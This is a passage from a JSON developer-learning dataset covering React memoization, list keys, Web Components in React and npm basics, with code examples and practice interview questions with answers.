wraps a functional component and memoizes its rendered output. It prevents a functional component from re-rendering if its props have not changed. By default, `React.memo` performs a shallow comparison of the props. If you need more control over the comparison, you can provide a custom comparison function as the second argument to `React.memo`.\n\n### When to use `React.memo`:\n*   **Pure Functional Components**: For components that render the same output given the same props.\n*   **Heavy Components**: Components with complex UI or many nested components that are expensive to render.\n*   **Frequent Re-renders**: Components that re-render often due to parent re-renders but whose props frequently remain the same.\n\n**Important Considerations for Memoization:**\n*   **Overhead**: Memoization itself has a small overhead (memory for caching, comparison logic). It should only be used when the cost of re-rendering or re-computing outweighs this overhead.\n*   **Correct Dependencies**: Incorrect or missing dependencies can lead to stale closures or values, causing bugs. Always ensure the dependency array is accurate.\n*   **Debugging**: Memoization can sometimes make debugging more complex as components might not re-render when expected, leading to stale UI if not correctly implemented.",
          "examples": [
            {
              "id": "example_react_memoization_1",
              "title": "Basic useMemo and useCallback",
              "code": "import React, { useMemo, useCallback, useState } from 'react';\n\nfunction ExpensiveCalculationDisplay({ numbers }) {\n  const sum = useMemo(() => {\n    console.log('Calculating sum...');\n    return numbers.reduce((acc, num) => acc + num, 0);\n  }, [numbers]); // Recalculates only if 'numbers' array changes\n\n  return <p>Sum: {sum}</p>;\n}\n\n// Memoized child component for demonstration\nconst Button = React.memo(({ onClick, label }) => {\n  console.log(`Rendering ${label} Button`);\n  return <button onClick={onClick}>{label}</button>;\n});\n\nfunction ParentComponent() {\n  const [count, setCount] = useState(0);\n  const [data, setData] = useState([1, 2, 3]);\n\n  // This function would be re-created on every render without useCallback\n  // and cause Button to re-render even if its props haven't conceptually changed.\n  const incrementCount = useCallback(() => {\n    setCount(prevCount => prevCount + 1);\n  }, []); // Empty dependency array means it's created once\n\n  return (\n    <div>\n      <p>Count: {count}</p>\n      <Button onClick={incrementCount} label=\"Increment\" />\n      <ExpensiveCalculationDisplay numbers={data} />\n      <button onClick={() => setData([...data, Math.random()])}>Add Random Number</button>\n      <button onClick={() => setCount(count + 1)}>Force Parent Re-render</button>\n    </div>\n  );\n}",
              "explanation": "This example demonstrates `useMemo` to cache an expensive sum calculation for the `ExpensiveCalculationDisplay` component, only re-computing when `numbers` changes. `useCallback` is used to memoize the `incrementCount` function, ensuring that the `Button` component (which is wrapped in `React.memo`) does not re-render unnecessarily when `ParentComponent` re-renders due to `data` changes, only when its `onClick` prop (the memoized `incrementCount`) actually changes, which it won't due to `useCallback` with an empty dependency array.",
              "language": "typescript"
            },
            {
              "id": "example_react_memoization_2",
              "title": "React.memo with Custom Comparison",
              "code": "import React from 'react';\n\ninterface ItemProps {\n  item: { id: number; value: string; timestamp: number; };\n  onClick: (id: number) => void;\n}\n\n// Custom comparison function for React.memo\n// Only re-render if id or value changes, ignore timestamp\nconst areEqual = (prevProps: ItemProps, nextProps: ItemProps) => {\n  return (\n    prevProps.item.id === nextProps.item.id &&\n    prevProps.item.value === nextProps.item.value &&\n    prevProps.onClick === nextProps.onClick // Ensure callback is stable\n  );\n};\n\nconst MemoizedListItem = React.memo(({\n  item,\n  onClick\n}: ItemProps) => {\n  console.log(`Rendering Item: ${item.value}`);\n  return (\n    <li onClick={() => onClick(item.id)}>\n      {item.value} (ID: {item.id})\n    </li>\n  );\n}, areEqual);\n\nfunction ItemList({ items, onItemClick }) {\n  return (\n    <ul>\n      {items.map(item => (\n        <MemoizedListItem key={item.id} item={item} onClick={onItemClick} />\n      ))}\n    </ul>\n  );\n}",
              "explanation": "This example shows `React.memo` with a custom comparison function (`areEqual`). The `MemoizedListItem` will only re-render if its `id`, `value`, or `onClick` prop changes. The `timestamp` property on the `item` object is explicitly ignored in the comparison, demonstrating how to fine-tune re-render behavior for specific use cases where a shallow comparison might be too broad or too narrow.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "React",
            "Performance",
            "Optimization",
            "Hooks",
            "useMemo",
            "useCallback",
            "React.memo",
            "Memoization"
          ],
          "technology": "React",
          "prerequisites": [
            "react_functional_components",
            "react_state_props"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "large_scale_react_apps",
            "performance_tuning"
          ]
        },
        {
          "id": "theory_virtual_dom_keys",
          "title": "Virtual DOM Optimization: Keys for Efficient List Rendering",
          "content": "React uses a Virtual DOM to optimize updates to the actual DOM. When state or props of a component change, React creates a new Virtual DOM tree and then efficiently compares it with the previous Virtual DOM tree (a process called 'reconciliation') to identify the minimal set of changes needed for the actual DOM. This diffing algorithm is crucial for performance.\n\n## The Role of `key` Prop in Lists\nWhen rendering lists of elements in React (e.g., using `map`), it's essential to provide a unique `key` prop to each list item. The `key` prop helps React identify which items have changed, are added, or are removed. Without keys, or with non-unique keys (like array indices), React's reconciliation algorithm becomes less efficient and can lead to:\n\n1.  **Performance Issues**: Without stable keys, React might re-render or re-order elements unnecessarily, especially when items are added, removed, or reordered within the list. It might re-mount components instead of updating them.\n2.  **State Problems**: Input fields or other components within list items might lose their internal state when the list changes, as React might incorrectly identify items due to unstable keys.\n3.  **Bugs with Animations/Transitions**: Animations tied to component lifecycles might behave unexpectedly.\n\n### Best Practices for `key`:\n*   **Unique and Stable**: Keys must be unique among siblings and stable (i.e., they should not change between re-renders for the same item). The best source for a key is a unique ID from your data (e.g., `item.id`).\n*   **Avoid Using Array Index as Key**: Using an array index (`index`) as a key is generally discouraged, especially if the list can be reordered, filtered, or new items can be added in the middle. While it might seem convenient, it leads to the exact performance and state issues mentioned above. It's only acceptable if the list is static and will never be reordered, filtered, or have items added/removed.\n*   **Avoid `Math.random()` or other volatile values**: These values change on every render, defeating the purpose of keys and forcing unnecessary re-renders.\n\nBy providing a stable and unique `key`, React can efficiently update the DOM by reordering existing elements rather than re-creating them, maintaining their state, and significantly improving performance.",
          "examples": [
            {
              "id": "example_virtual_dom_keys_1",
              "title": "Correct Key Usage in Lists",
              "code": "import React from 'react';\n\ninterface Todo { id: string; text: string; completed: boolean; }\n\nfunction TodoList({ todos }: { todos: Todo[] }) {\n  return (\n    <ul>\n      {todos.map(todo => (\n        // Using a unique ID from the data as the key\n        <li key={todo.id}>{todo.text}</li>\n      ))}\n    </ul>\n  );\n}",
              "explanation": "This example demonstrates the correct usage of the `key` prop for list items. Each `todo` object has a unique `id`, which is used as the `key`. This allows React to efficiently identify and update individual `li` elements when the `todos` array changes (e.g., an item is added, removed, or its properties are updated).",
              "language": "typescript"
            },
            {
              "id": "example_virtual_dom_keys_2",
              "title": "Incorrect Key Usage (and its consequences)",
              "code": "import React, { useState } from 'react';\n\nfunction BadTodoList() {\n  const [items, setItems] = useState([\n    { id: 'a', text: 'Item A' },\n    { id: 'b', text: 'Item B' },\n    { id: 'c', text: 'Item C' },\n  ]);\n\n  const addItemAtBeginning = () => {\n    const newItem = { id: Date.now().toString(), text: `New Item ${Date.now()}` };\n    setItems([newItem, ...items]);\n  };\n\n  return (\n    <div>\n      <button onClick={addItemAtBeginning}>Add Item at Beginning</button>\n      <ul>\n        {items.map((item, index) => (\n          // BAD PRACTICE: Using index as key when items can be reordered/added\n          <li key={index}>\n            {item.text} <input type=\"text\" placeholder=\"Enter something\" />\n          </li>\n        ))}\n      </ul>\n    </div>\n  );\n}",
              "explanation": "This example illustrates the problematic use of array `index` as a `key`. When a new item is added to the beginning of the `items` array, all subsequent items shift their indices. React sees that `item[0]` now contains the *new* item, but it assumes `item[1]` (which was `item[0]` before) is the *same* element. This can lead to incorrect state preservation (e.g., the input values might shift incorrectly) and inefficient re-renders, as React re-mounts or re-renders more elements than necessary.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "React",
            "Virtual DOM",
            "Keys",
            "Lists",
            "Performance",
            "Reconciliation",
            "Optimization"
          ],
          "technology": "React",
          "prerequisites": [
            "react_rendering_process",
            "react_lists"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "efficient_list_rendering",
            "large_scale_react_apps"
          ]
        },
        {
          "id": "theory_web_components_in_react",
          "title": "Web Components in React",
          "content": "Web Components are a set of standardized web platform APIs that allow developers to create new custom, reusable, and encapsulated HTML elements. They are composed of four main specifications:\n\n1.  **Custom Elements**: Allow you to define new HTML tags (e.g., `<my-button>`).\n2.  **Shadow DOM**: Provides a way to encapsulate a component's internal structure, styles, and behavior, isolating them from the main document's DOM. This prevents style leaks and global CSS conflicts.\n3.  **HTML Templates**: `<template>` and `<slot>` elements enable defining reusable markup templates.\n4.  **ES Modules**: Provide a standardized way to define, import, and export JavaScript modules, which is used for importing Web Components.\n\nWhile React components and Web Components serve different purposes (React components for building application UIs with declarative syntax and state management, Web Components for creating reusable low-level UI elements), they can work together seamlessly.\n\n### Integrating Web Components with React:\nWeb Components can be used directly within JSX as if they were standard HTML elements. React passes data to Web Components as attributes. For complex data types (objects, arrays), you might need to stringify them or use properties directly if the Web Component exposes a way to set properties via JavaScript.\n\n#### Key Benefits of Using Web Components with React:\n1.  **Encapsulation**: Web Components use Shadow DOM, which provides strong style and markup encapsulation. This means the styles defined within a Web Component won't leak out and affect other parts of your React application, and vice-versa. This is particularly useful for creating truly isolated UI widgets.\n2.  **Reusability**: Custom elements can be used across different frameworks (React, Angular, Vue, etc.) or even without any framework, as they are based on native web standards. This makes them highly portable and ideal for design systems or component libraries that need to be framework-agnostic.\n3.  **Standard-based**: Being built upon web standards ensures long-term compatibility and reduces reliance on specific framework implementations or proprietary solutions.\n4.  **Framework Agnostic**: Web Components work natively in the browser, making them a 'write once, use anywhere' solution for UI elements. This portability is a significant advantage for large organizations using multiple frontend technologies or for distributing UI components.\n\n#### Considerations:\n*   **Event Handling**: Web Components use standard DOM events. React's synthetic event system may not always capture events from Shadow DOM. You might need to attach event listeners directly to the DOM element using `useRef` and `addEventListener` or ensure the Web Component dispatches custom events that bubble up.\n*   **Passing Complex Data**: React's prop system passes primitives and simple objects as attributes. For complex objects or arrays, you might need to set properties on the underlying DOM node using refs, as attributes are always strings.\n*   **Tooling/SSR**: Server-Side Rendering (SSR) and tooling for Web Components can sometimes be less mature or require different setups compared to React's own ecosystem.\n\nDespite these considerations, Web Components offer a powerful way to integrate highly reusable, encapsulated, and framework-agnostic UI elements into a React application, enhancing interoperability and long-term maintainability.",
          "examples": [
            {
              "id": "example_web_components_in_react_1",
              "title": "Using a Vaadin Web Component in React",
              "code": "import React, { Component } from 'react';\nimport '@vaadin/vaadin-date-picker'; // Importing the Web Component\n\nclass WebComponentExample extends Component {\n  // For handling events from Web Components, you might need a ref\n  datePickerRef = React.createRef<any>();\n\n  componentDidMount() {\n    // Accessing the native Web Component element to attach event listeners\n    if (this.datePickerRef.current) {\n      this.datePickerRef.current.addEventListener('value-changed', (event: CustomEvent) => {\n        console.log('Date changed:', event.detail.value);\n      });\n    }\n  }\n\n  render() {\n    return (\n      <div className=\"App\">\n        {/* Using the Web Component within React, passing a prop as attribute */}\n        <vaadin-date-picker\n          label=\"When were you born?\"\n          ref={this.datePickerRef} // Attach ref to access native element\n        ></vaadin-date-picker>\n        <p>This is a standard React paragraph.</p>\n      </div>\n    );\n  }\n}\n\nexport default WebComponentExample;",
              "explanation": "This example shows how to import and use a `vaadin-date-picker` Web Component directly within a React component's JSX. The `label` prop is passed as an HTML attribute. It also demonstrates how to use a `ref` and `addEventListener` in `componentDidMount` (or `useEffect` for functional components) to listen to custom events dispatched by the Web Component, which is often necessary because React's synthetic event system might not automatically capture events from inside Shadow DOM.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "React",
            "Web Components",
            "Custom Elements",
            "Shadow DOM",
            "Framework Agnostic",
            "Interoperability",
            "Front-end Architecture"
          ],
          "technology": "React",
          "prerequisites": [
            "html_custom_elements",
            "react_components",
            "dom_events"
          ],
          "complexity": 7,
          "interviewRelevance": 7,
          "learningPath": "advanced",
          "requiredFor": [
            "design_systems",
            "micro_frontends",
            "legacy_integration"
          ]
        },
        {
          "id": "theory_javascript_build_tools_npm",
          "title": "Modern JavaScript Build Tools and Workflow: Package Managers (NPM)",
          "content": "Modern JavaScript development heavily relies on a robust ecosystem of build tools and package managers to manage dependencies, automate tasks, optimize code, and prepare applications for deployment. These tools are fundamental for efficient and scalable frontend development.\n\n## Package Managers\nPackage managers are essential tools for installing, updating, configuring, and removing libraries and dependencies used in a software project. They automate the process of managing external code modules.\n\n### NPM (Node Package Manager)\nNPM is the default and most widely used package manager for the Node.js runtime environment. It comes bundled automatically with every Node.js installation. NPM serves a dual purpose:\n\n1.  **Command-Line Interface (CLI)**: A tool to interact with the NPM registry, allowing developers to install, publish, and manage packages.\n2.  **Online Registry**: A public database of open-source Node.js packages (and frontend libraries). This registry hosts millions of packages, making it the largest software registry in the world.\n\n#### Key functionalities of NPM CLI:\n*   **`npm init`**: Initializes a new Node.js project, creating a `package.json` file which stores project metadata and dependency information.\n*   **`npm install [package-name]`**: Installs a specific package. By default, it installs the latest version. It adds the package to `node_modules` and saves it as a dependency in `package.json` (as a `dependency` or `devDependency`).\n*   **`npm install`**: Installs all dependencies listed in the `package.json` file. This is crucial for setting up a project on a new machine or after cloning a repository.\n*   **`npm uninstall [package-name]`**: Removes a package from `node_modules` and `package.json`.\n*   **`npm update [package-name]`**: Updates a specific package to its latest compatible version.\n*   **`npm run [script-name]`**: Executes custom scripts defined in the `scripts` section of `package.json`. This is commonly used for running build processes, tests, development servers, etc.\n*   **`npm audit`**: Scans your project for security vulnerabilities in your dependencies.\n\n#### `package.json` and `package-lock.json`\n*   **`package.json`**: This file is at the heart of any Node.js/JavaScript project. It contains metadata about the project (name, version, description, author), defines scripts, and lists project dependencies and devDependencies with semantic versioning ranges (e.g., `^1.0.0`).\n*   **`package-lock.json`**: This file is automatically generated and updated by NPM (and Yarn). It records the *exact* versions of all installed packages (including transitive dependencies) and their checksums. Its purpose is to ensure that future `npm install` operations produce the identical `node_modules` tree, regardless of when `npm install` is run or which version of NPM is used. This guarantees consistent builds across different environments and team members.\n\nNPM (along with Yarn and pnpm) is an indispensable tool for managing the complex dependency graphs common in modern web development.",
          "examples": [
            {
              "id": "example_npm_1",
              "title": "Basic NPM Commands and package.json structure",
              "code": "// To initialize a new project and create package.json\nnpm init -y\n\n// Install a package (e.g., React)\nnpm install react react-dom\n\n// Install a dev dependency (e.g., Webpack)\nnpm install webpack --save-dev\n\n// Running a custom script defined in package.json\nnpm run start\n\n/* Example package.json content: */\n{\n  \"name\": \"my-react-app\",\n  \"version\": \"1.0.0\",\n  \"description\": \"A simple React app.\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"start\": \"react-scripts start\",\n    \"build\": \"react-scripts build\",\n    \"test\": \"react-scripts test\"\n  },\n  \"keywords\": [],\n  \"author\": \"Your Name\",\n  \"license\": \"ISC\",\n  \"dependencies\": {\n    \"react\": \"^18.2.0\",\n    \"react-dom\": \"^18.2.0\"\n  },\n  \"devDependencies\": {\n    \"webpack\": \"^5.88.2\"\n  }\n}",
              "explanation": "This example shows common NPM CLI commands and a basic `package.json` structure. `npm init -y` quickly sets up a project. `npm install` commands add packages to `dependencies` or `devDependencies` in `package.json`. The `scripts` section defines runnable commands, which can be executed with `npm run <script-name>`. This illustrates the central role of `package.json` in managing project dependencies and scripts.",
              "language": "shell"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "JavaScript",
            "Node.js",
            "NPM",
            "Package Manager",
            "Build Tools",
            "Workflow",
            "Dependencies",
            "package.json",
            "package-lock.json"
          ],
          "technology": "Node.js",
          "prerequisites": [
            "javascript_basics",
            "command_line_basics"
          ],
          "complexity": 5,
          "interviewRelevance": 8,
          "learningPath": "beginner",
          "requiredFor": [
            "any_javascript_project",
            "frontend_development"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_react_memoization_1",
          "topic": "React Performance Optimization",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following React functional component. What is the primary purpose of wrapping `MyComponent` with `React.memo` as `MemoizedComponent`?\n\n```jsx\nimport React, { useMemo, useCallback } from 'react';\n\nfunction MyComponent({ data, onItemClick }) {\n  const processedData = useMemo(() => {\n    return data.map(item => performExpensiveOperation(item));\n  }, [data]);\n  \n  const handleClick = useCallback((id) => {\n    onItemClick(id);\n  }, [onItemClick]);\n  \n  return (\n    <ul>\n      {processedData.map(item => (\n        <li key={item.id} onClick={() => handleClick(item.id)}>\n          {item.name}\n        </li>\n      ))}\n    </ul>\n  );\n}\n\nconst MemoizedComponent = React.memo(MyComponent);\n```",
          "answer": "To prevent `MyComponent` from re-rendering if its props (`data` and `onItemClick`) have not changed.",
          "options": [
            "To make `processedData` recalculate only when `data` changes.",
            "To ensure `handleClick` is created only once.",
            "To prevent `MyComponent` from re-rendering if its props (`data` and `onItemClick`) have not changed.",
            "To optimize the initial render time of `MyComponent`."
          ],
          "analysisPoints": [
            "`React.memo` is a HOC that memoizes a functional component, preventing re-renders if props are shallowly equal.",
            "`useMemo` memoizes a value (like `processedData`), not the component itself.",
            "`useCallback` memoizes a function (like `handleClick`), not the component itself.",
            "`React.memo` optimizes subsequent re-renders, not the initial render."
          ],
          "keyConcepts": [
            "React.memo",
            "Memoization",
            "Performance Optimization",
            "Component Re-rendering"
          ],
          "evaluationCriteria": [
            "Understanding of `React.memo`'s functionality.",
            "Ability to differentiate `React.memo` from `useMemo` and `useCallback`."
          ],
          "example": "The `React.memo` HOC is designed to optimize functional components by preventing unnecessary re-renders. When `MemoizedComponent` is used, React will only re-render it if the `data` prop or the `onItemClick` prop (or any other prop passed to it) has changed shallowly compared to the previous render. This saves performance by skipping the execution of `MyComponent`'s render logic.",
          "tags": [
            "React",
            "Performance",
            "React.memo",
            "MCQ"
          ],
          "prerequisites": [
            "react_functional_components",
            "react_props"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_memoization_2",
          "topic": "React Performance Optimization",
          "level": "medium",
          "type": "open",
          "question": "Explain the difference between `useMemo` and `useCallback` in React. Provide a scenario where using `useCallback` is particularly beneficial, even when `useMemo` might seem similar.",
          "answer": null,
          "options": [],
          "analysisPoints": [
            "`useMemo` memoizes the *result* of a function (a value). `useCallback` memoizes the *function itself* (a reference).",
            "Both take a function and a dependency array. `useMemo` executes the function and caches its return value; `useCallback` returns the memoized function reference.",
            "Scenario for `useCallback`: Passing a callback to a `React.memo` wrapped child component. If the parent re-renders, the function reference would change without `useCallback`, forcing the `React.memo` child to re-render even if its actual logic hasn't changed. `useCallback` ensures the function reference remains stable across parent renders, allowing `React.memo` to effectively prevent re-renders of the child."
          ],
          "keyConcepts": [
            "useMemo",
            "useCallback",
            "Memoization",
            "Referential Equality",
            "React.memo",
            "Performance Optimization"
          ],
          "evaluationCriteria": [
            "Clarity and accuracy of definitions.",
            "Understanding of when to apply each hook.",
            "Ability to articulate the specific benefit of `useCallback` in a practical scenario (e.g., with `React.memo` children)."
          ],
          "example": "```typescript\nimport React, { useState, useCallback, useMemo } from 'react';\n\nconst ChildComponent = React.memo(({ onClick, value }) => {\n  console.log('ChildComponent re-rendered');\n  return <button onClick={onClick}>Child Button: {value}</button>;\n});\n\nfunction ParentComponent() {\n  const [count, setCount] = useState(0);\n  const [text, setText] = useState('Hello');\n\n  // Scenario for useCallback: Passing a stable callback to a memoized child\n  const handleChildClick = useCallback(() => {\n    setCount(prev => prev + 1);\n  }, []); // Empty dependency array means this function reference is stable\n\n  // Example for useMemo: Expensive calculation\n  const expensiveValue = useMemo(() => {\n    console.log('Calculating expensive value...');\n    let sum = 0;\n    for (let i = 0; i < 10000000; i++) {\n      sum += i;\n    }\n    return sum + count; // Recalculates if count changes\n  }, [count]);\n\n  return (\n    <div>\n      <p>Parent Count: {count}</p>\n      <p>Parent Text: {text}</p>\n      <p>Expensive Value: {expensiveValue}</p>\n      <ChildComponent onClick={handleChildClick} value={count} />\n      <button onClick={() => setText(text + '!')}>Change Parent Text (Forces Parent Re-render)</button>\n    </div>\n  );\n}\n```\nIn `ParentComponent`, if `setText` is called, `ParentComponent` re-renders. Without `useCallback` for `handleChildClick`, a *new* function reference would be created on each render. Even though the *logic* of `handleChildClick` hasn't changed, its reference would. Since `ChildComponent` is `React.memo`-ized, it performs a shallow prop comparison. A new function reference for `onClick` would cause `ChildComponent` to re-render unnecessarily. `useCallback` prevents this by returning the same function reference unless its dependencies change.",
          "tags": [
            "React",
            "useMemo",
            "useCallback",
            "React.memo",
            "Performance",
            "Hooks",
            "Open-Ended"
          ],
          "prerequisites": [
            "react_hooks",
            "react_functional_components",
            "referential_equality"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_memoization_3",
          "topic": "React Performance Optimization",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary benefit of using `React.memo`?",
          "answer": "It prevents a functional component from re-rendering if its props have not changed (based on a shallow comparison by default).",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "React.memo",
            "Memoization",
            "Performance"
          ],
          "evaluationCriteria": [],
          "example": null,
          "tags": [
            "React",
            "React.memo",
            "Performance",
            "Flashcard"
          ],
          "prerequisites": [
            "react_functional_components"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_react_memoization_4",
          "topic": "React Performance Optimization",
          "level": "hard",
          "type": "code",
          "question": "Optimize the following React component to prevent unnecessary re-renders of the `ListItem` component. The `ListItem` should only re-render if its `item`'s `text` or `completed` status changes, or if the `onToggle` callback changes. The `items` array in `ParentComponent` can frequently update with new `timestamp` values for existing items. Also, ensure the `filterCompleted` calculation is memoized.\n\n```jsx\nimport React, { useState } from 'react';\n\nfunction ListItem({ item, onToggle }) {\n  console.log(`Rendering ListItem: ${item.text}`);\n  return (\n    <li style={{ textDecoration: item.completed ? 'line-through' : 'none' }}>\n      {item.text}\n      <button onClick={() => onToggle(item.id)}>Toggle</button>\n    </li>\n  );\n}\n\nfunction ParentComponent() {\n  const [items, setItems] = useState([\n    { id: 1, text: 'Buy milk', completed: false, timestamp: Date.now() },\n    { id: 2, text: 'Walk dog', completed: true, timestamp: Date.now() },\n  ]);\n  const [filter, setFilter] = useState('all'); // 'all', 'completed', 'active'\n\n  const handleToggle = (id) => {\n    setItems(prevItems =>\n      prevItems.map(item =>\n        item.id === id ? { ...item, completed: !item.completed, timestamp: Date.now() } : item\n      )\n    );\n  };\n\n  const filteredItems = items.filter(item => {\n    console.log('Filtering items...');\n    if (filter === 'completed') return item.completed;\n    if (filter === 'active') return !item.completed;\n    return true;\n  });\n\n  return (\n    <div>\n      <button onClick={() => setFilter('all')}>All</button>\n      <button onClick={() => setFilter('active')}>Active</button>\n      <button onClick={() => setFilter('completed')}>Completed</button>\n      <ul>\n        {filteredItems.map(item => (\n          <ListItem key={item.id} item={item} onToggle={handleToggle} />\n        ))}\n      </ul>\n    </div>\n  );\n}\n```",
          "answer": null,
          "options": [],
          "analysisPoints": [
            "Wrap `ListItem` with `React.memo` and provide a custom comparison function that checks `item.id`, `item.text`, `item.completed`, and `onToggle`.",
            "Memoize `handleToggle` using `useCallback` with an empty dependency array (or `[]` if it doesn't depend on outer scope, or `[setItems]` if it needs `setItems`). Given `setItems` is stable, `[]` is fine.",
            "Memoize `filteredItems` using `useMemo` with `items` and `filter` as dependencies."
          ],
          "keyConcepts": [
            "React.memo",
            "useCallback",
            "useMemo",
            "Custom Comparison Function",
            "Performance Optimization",
            "Referential Equality"
          ],
          "evaluationCriteria": [
            "Correct application of `React.memo` with a custom comparison.",
            "Correct application of `useCallback` for stable function references.",
            "Correct application of `useMemo` for expensive calculations.",
            "Understanding of dependency arrays.",
            "Ability to identify and address specific re-rendering issues."
          ],
          "example": "```typescript\nimport React, { useState, useCallback, useMemo } from 'react';\n\ninterface TodoItem {\n  id: number;\n  text: string;\n  completed: boolean;\n  timestamp: number;\n}\n\ninterface ListItemProps {\n  item: TodoItem;\n  onToggle: (id: number) => void;\n}\n\n// Custom comparison for ListItem\nconst areEqualListItem = (prevProps: ListItemProps, nextProps: ListItemProps) => {\n  return (\n    prevProps.item.id === nextProps.item.id &&\n    prevProps.item.text === nextProps.item.text &&\n    prevProps.item.completed === nextProps.item.completed &&\n    prevProps.onToggle === nextProps.onToggle\n  );\n};\n\nconst MemoizedListItem = React.memo(function ListItem({ item, onToggle }: ListItemProps) {\n  console.log(`Rendering ListItem: ${item.text}`);\n  return (\n    <li style={{ textDecoration: item.completed ? 'line-through' : 'none' }}>\n      {item.text}\n      <button onClick={() => onToggle(item.id)}>Toggle</button>\n    </li>\n  );\n}, areEqualListItem);\n\nfunction ParentComponent() {\n  const [items, setItems] = useState<TodoItem[]>([\n    { id: 1, text: 'Buy milk', completed: false, timestamp: Date.now() },\n    { id: 2, text: 'Walk dog', completed: true, timestamp: Date.now() },\n  ]);\n  const [filter, setFilter] = useState<'all' | 'completed' | 'active'>('all');\n\n  // Memoize handleToggle to prevent unnecessary re-renders of MemoizedListItem\n  const handleToggle = useCallback((id: number) => {\n    setItems(prevItems =>\n      prevItems.map(item =>\n        item.id === id ? { ...item, completed: !item.completed, timestamp: Date.now() } : item\n      )\n    );\n  }, []); // setItems from useState is guaranteed to be stable, so empty array is fine\n\n  // Memoize filteredItems calculation\n  const filteredItems = useMemo(() => {\n    console.log('Filtering items...');\n    return items.filter(item => {\n      if (filter === 'completed') return item.completed;\n      if (filter === 'active') return !item.completed;\n      return true;\n    });\n  }, [items, filter]); // Recalculate only if items or filter changes\n\n  return (\n    <div>\n      <button onClick={() => setFilter('all')}>All</button>\n      <button onClick={() => setFilter('active')}>Active</button>\n      <button onClick={() => setFilter('completed')}>Completed</button>\n      <ul>\n        {filteredItems.map(item => (\n          <MemoizedListItem key={item.id} item={item} onToggle={handleToggle} />\n        ))}\n      </ul>\n    </div>\n  );\n}\n```",
          "tags": [
            "React",
            "Performance",
            "Optimization",
            "Hooks",
            "React.memo",
            "useCallback",
            "useMemo",
            "Code"
          ],
          "prerequisites": [
            "react_functional_components",
            "react_hooks",
            "react_memoization"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_virtual_dom_keys_1",
          "topic": "Virtual DOM Optimization: Keys",
          "level": "easy",
          "type": "flashcard",
          "question": "Why do elements rendered in a list in React need a unique `key` prop?",
          "answer": "Keys help React identify which items have changed, are added, or are removed during reconciliation, leading to efficient updates of the DOM.",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "Keys",
            "Virtual DOM",
            "Reconciliation",
            "List Rendering"
          ],
          "evaluationCriteria": [],
          "example": null,
          "tags": [
            "React",
            "Keys",
            "Virtual DOM",
            "Flashcard"
          ],
          "prerequisites": [
            "react_lists"
          ],
          "complexity": 3,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_virtual_dom_keys_2",
          "topic": "Virtual DOM Optimization: Keys",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following scenarios is MOST likely to cause issues (performance or state) if array indices are used as `key` props for a list in React?\n\n```jsx\nfunction ItemList({ items }) {\n  return (\n    <ul>\n      {items.map((item, index) => (\n        <li key={index}>{item.text} <input type=\"text\" /></li>\n      ))}\n    </ul>\n  );\n}\n```",
          "answer": "Adding a new item to the beginning or middle of the `items` array.",
          "options": [
            "Adding a new item to the end of the `items` array.",
            "Removing an item from the end of the `items` array.",
            "Only updating a property of an existing item (e.g., `item.text`).",
            "Adding a new item to the beginning or middle of the `items` array."
          ],
          "analysisPoints": [
            "Using index as a key is problematic when the order of items can change, or when items can be added/removed from the middle/beginning.",
            "If an item is added to the beginning, all existing items shift their indices, causing React to mistakenly think existing items have changed, leading to re-mounting or incorrect state preservation.",
            "Adding to the end or removing from the end generally does not cause issues with index keys, as existing items' indices don't change."
          ],
          "keyConcepts": [
            "Keys",
            "Array Index",
            "Reconciliation",
            "List Performance",
            "State Preservation"
          ],
          "evaluationCriteria": [
            "Understanding of the pitfalls of using array index as a key.",
            "Ability to identify scenarios where index keys cause problems."
          ],
          "example": "When an item is added to the beginning, say we have `['A', 'B']` with keys `0, 1`. If we add 'X' at the beginning, the array becomes `['X', 'A', 'B']`. With index keys, React sees `X` at index `0`, `A` at index `1`, `B` at index `2`. It might try to 'update' the old `A` (at index 0) into `X`, and the old `B` (at index 1) into `A`, rather than simply inserting `X` at the beginning and preserving `A` and `B`. This leads to inefficient DOM manipulations and potential loss of internal component state (like an `<input>`'s value).",
          "tags": [
            "React",
            "Keys",
            "Virtual DOM",
            "MCQ",
            "List Rendering"
          ],
          "prerequisites": [
            "react_lists",
            "react_virtual_dom"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_virtual_dom_keys_3",
          "topic": "Virtual DOM Optimization: Keys",
          "level": "medium",
          "type": "open",
          "question": "You are building a chat application where new messages appear at the bottom of the list. Each message has a unique `id`. Would you use `Math.random()` as a `key` for each message? Explain why or why not, and propose a better alternative.",
          "answer": null,
          "options": [],
          "analysisPoints": [
            "No, `Math.random()` should never be used as a key.",
            "Reason: `Math.random()` generates a new, unique value on *every* render. This defeats the purpose of keys, as React will perceive every list item as a 'new' item on every re-render, even if the content hasn't changed. This leads to maximum inefficiency (forcing re-creation of all DOM nodes and re-mounting of components) and potential state loss.",
            "Better alternative: Use the unique `id` provided for each message. If no stable ID is available from the data, consider generating one when the data is first created (e.g., using a UUID library).",
            "Even if new messages are only added to the end, using `Math.random()` still causes unnecessary re-renders of the *entire* list, as keys are unstable."
          ],
          "keyConcepts": [
            "Keys",
            "Stability of Keys",
            "Performance Implications",
            "Virtual DOM",
            "Reconciliation"
          ],
